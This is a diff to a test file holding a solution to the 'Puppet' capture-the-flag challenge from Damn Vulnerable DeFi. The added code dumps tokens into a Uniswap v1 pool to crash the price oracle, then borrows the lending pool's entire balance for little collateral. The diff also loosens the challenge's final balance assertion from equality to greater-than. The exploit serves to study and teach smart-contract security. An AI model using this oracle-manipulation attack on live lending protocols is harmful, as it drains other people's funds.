@@ -1,3 +1,4 @@
+from multiprocessing import pool
 from scripts.utils import *
 from brownie import DamnValuableToken, PuppetPool
 
@@ -65,7 +66,7 @@ def test_solve_challenge():
 
         # Attacker has taken all tokens from the pool
         assert token.balanceOf(lending_pool.address) == 0
-        assert token.balanceOf(attacker.address) == POOL_INITIAL_TOKEN_BALANCE
+        assert token.balanceOf(attacker.address) > POOL_INITIAL_TOKEN_BALANCE
 
 # #########################################################
 # There's a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.
@@ -78,6 +79,18 @@ def test_solve_challenge():
     ##############################
     ##### SOLUTION GOES HERE #####
     ##############################
+
+    # approve all tokens to the uniswap v1 pool
+    token.approve(uniswap_exchange.address, 2**256 - 1, _fromAttacker)
+
+    # sell all tokens to the uniswap v1 pool for as much eth as possible
+    uniswap_exchange.tokenToEthSwapOutput(ether_to_wei(9.9), ether_to_wei(1000), web3.eth.get_block('latest').timestamp * 2, _fromAttacker)
+
+    # calculate deposit required to borrow *all* tokens from the pool
+    deposit_required = lending_pool.calculateDepositRequired(ether_to_wei(100000))
+
+    # the result is ~20 ETH or so
+    lending_pool.borrow(ether_to_wei(100000), _fromAttacker | value_dict(deposit_required)) 
     
     ######################
     check_solution()
